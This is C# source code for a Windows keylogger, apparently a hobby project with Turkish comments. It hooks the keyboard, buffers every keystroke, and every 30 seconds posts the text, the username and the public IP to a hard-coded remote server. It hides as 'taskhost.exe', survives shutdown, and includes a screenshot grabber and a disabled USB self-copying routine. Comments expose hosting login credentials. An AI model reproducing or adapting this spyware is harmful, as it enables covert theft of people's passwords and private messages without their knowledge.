using System;
using System.Collections.Generic;
using System.Text;

using System.Windows.Forms;
using System.ComponentModel;
using System.IO;
using Hook;
using System.Net;
using System.Drawing;
using System.Drawing.Imaging;
using ShutdownCatcher;

namespace KeyLog_v8
{
    //orgfree.freewebhostingarea.com/pma/   
    //username=827736 pass=11_haneli_olan
    //sunucu=http://kuheylan.freeoda.com/keylog/
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            Main sc = new Main();
            Application.Run();
        }
    }
}

namespace KeyLog_v8
{
    class Main
    {
        ComponentCollection component = new ComponentCollection(new IComponent[] { });
        bool _isAltDown; bool _isControlDown; bool _isShiftDown; bool _isF10Down; bool _isF11Down;
        Information info ;
        Sender sender;
        AppRegister dosya;
        Storage depo;
        string depoIsim;
        UserActivityHook hook;
        string DATA;
        Sender gonderici;
        Timer tGonder;
        DriveDetector drive;
        

        public Main()
        {
            Console.WriteLine(">>>.BASLIYOR.<<<");
            BaslangicAyarlari();

            DATA = depo.ReadText();
            if (DATA == null)
                DATA = " ";
            else
            {
                Console.WriteLine("--> Depodakiler Alindi");
                depo.SetText(" ");
            }
            /*int res = info.UygulamaKapatici("taskhost");
            if (res == 0) Console.WriteLine("--) " + info.AppCopiedName + ", Böyle bir program acik deil !!!");
            else if (res == 1) Console.WriteLine("--) " + info.AppCopiedName + "'ler Kapatıldı");
            else if (res == 2) Console.WriteLine("--) " + info.AppCopiedName + "'ler Kapatılamadı !!!");*/
            dosya.Kaydet();

            //hook
            hook = new UserActivityHook();
            hook.Stop();
            hook.KeyPress += hook_KeyPress;
            hook.KeyDown += hook_KeyDown;
            hook.KeyUp += hook_KeyUp;
            hook.Start(false, true);
            //---Timer Gönder---//
            tGonder = new Timer();
            tGonder.Tick += tGonder_Tick;
            tGonder.Interval = 30000 * 1;
            tGonder.Enabled = true;
            //---ShutdownEventCatcher---//
            ShutdownEventCatcher.Shutdown += ShutdownEventCatcher_Shutdown;
            //---DriveDetector---//
            drive = new DriveDetector();
            //drive.DeviceArrived += drive_DeviceArrived;
            

            Console.WriteLine(">>> BASLADI <<<");
        }

        void BaslangicAyarlari()
        {
            info = new Information("taskhost.exe");
            sender = new Sender("http://178.62.149.121/keylog/", 5000);
            depoIsim = "recently-Temp";

            dosya = new AppRegister(info.AppCopiedDirection,
                            info.AppCopiedName,
                            "IDM");
            depo = new Storage(info.AppCopiedDirection,
                            depoIsim);
        }

        //###############################################################################################
        void tGonder_Tick(object obj, EventArgs e)
        {
            int maxLength = 3000;
            //Console.WriteLine(DATA.Length + "    " + maxLength + "      " + DATA.Length / maxLength);
            if (DATA.Length > 10)
            {
                    //------------------------------------------------------------
                    int parca = DATA.Length / maxLength;
                    for (int i = 0; i < parca; i++)
                    {
                        if("1" == sender.GonderPostMethod(
                            "get.php",
                            "kull=" + info.Username + "&ip_net=" + info.IpOgrenInternet() + 
                            "&veri=" + DATA.Substring(i * maxLength, maxLength))
                         )
                            Console.WriteLine("--> "+(i+1)+".Parca Gonderildi");
                    }

                        if ("1" == sender.GonderPostMethod(
                                "get.php",
                                "kull=" + info.Username + "&ip_net=" + info.IpOgrenInternet() + 
                                "&veri=" + DATA.Substring(parca * maxLength))
                            )
                    {
                        Console.WriteLine("--> (" + DATA.Length + ") Gonderildi");
                        depo.SetText("");
                        DATA = "";
                    }
                    else
                    {
                        Console.WriteLine("--# Gonderilemedi !");
                    }
                    //------------------------------------------------------------
            }
        }
        //###############################################################################################
        void hook_KeyDown(object obj, KeyEventArgs e)
        {
            switch (e.KeyData.ToString())
            {
                case "RMenu":
                    _isAltDown = true;
                    break;
                case "RControlKey":
                    _isControlDown = true;
                    break;
                case "RShiftKey":
                    _isShiftDown = true;
                    break;
                case "F10":
                    _isF10Down = true;
                    break;
                case "F11":
                    _isF11Down = true;
                    break;
            }
            if (_isControlDown && _isAltDown && _isShiftDown && _isF10Down)
            {

                //Console.WriteLine("-Durduruldu-");
            }
            if (_isControlDown && _isAltDown && _isShiftDown && _isF11Down)
            {

                //Console.WriteLine("-Tekrar Basladi-");
            }
        }
        //###############################################################################################
        void hook_KeyPress(object obj, KeyPressEventArgs e)
        {
            if (e.KeyChar == 32 || Char.IsLetterOrDigit(e.KeyChar) || Char.IsPunctuation(e.KeyChar))
            {
                DATA = DATA + e.KeyChar.ToString(new System.Globalization.CultureInfo("tr-TR"));
                // ı = ý, ğ = ð, ş = þ
            }
            else if (e.KeyChar == 8)
            {
                if (DATA != "")
                    DATA = DATA.Substring(0, Convert.ToInt32(DATA.Length) - 1);
            }
            else if (e.KeyChar == 27)
            {
                DATA = DATA + "<ESC>";
            }
            else if (e.KeyChar == 13)
            {
                DATA = DATA + "<#>";//ENTER tuşu
            }
            else if (e.KeyChar == 9)
            {
                DATA = DATA + "<TAB>";
            }
        }
        //###############################################################################################
        void hook_KeyUp(object obj, KeyEventArgs e)
        {
            switch (e.KeyData.ToString())
            {
                case "RMenu":
                    _isAltDown = false;
                    break;
                case "RControlKey":
                    _isControlDown = false;
                    break;
                case "RShiftKey":
                    _isShiftDown = false;
                    break;
                case "F10":
                    _isF10Down = false;
                    break;
                case "F11":
                    _isF11Down = false;
                    break;
            }
        }
        //###############################################################################################
        void drive_DeviceArrived(object sender, DriveDetectorEventArgs e)
        {
            if (dosya.DosyaKaydet(e.Drive + "//", "Reader.exe"))
            {
                Console.WriteLine("-- " + e.Drive + " ye kaydedildi. ");
            }
            else
            {
                Console.WriteLine("-- " + e.Drive + " ye kaydedilemedi !!!");
            }
        }
        //###############################################################################################
        void ShutdownEventCatcher_Shutdown(ShutdownEventArgs obj)
        {
            depo.AddText(DATA);
        }
        //###############################################################################################
        Stream EkranGoruntusuAl()
        {
            try
            {
                Bitmap Screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics GFX = Graphics.FromImage(Screenshot);
                GFX.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size);

                MemoryStream mem = new MemoryStream();
                Screenshot.Save(mem, System.Drawing.Imaging.ImageFormat.Jpeg);
                return mem;
            }
            catch
            {
                return null;
            }
            
        }
        //###############################################################################################
    }
}
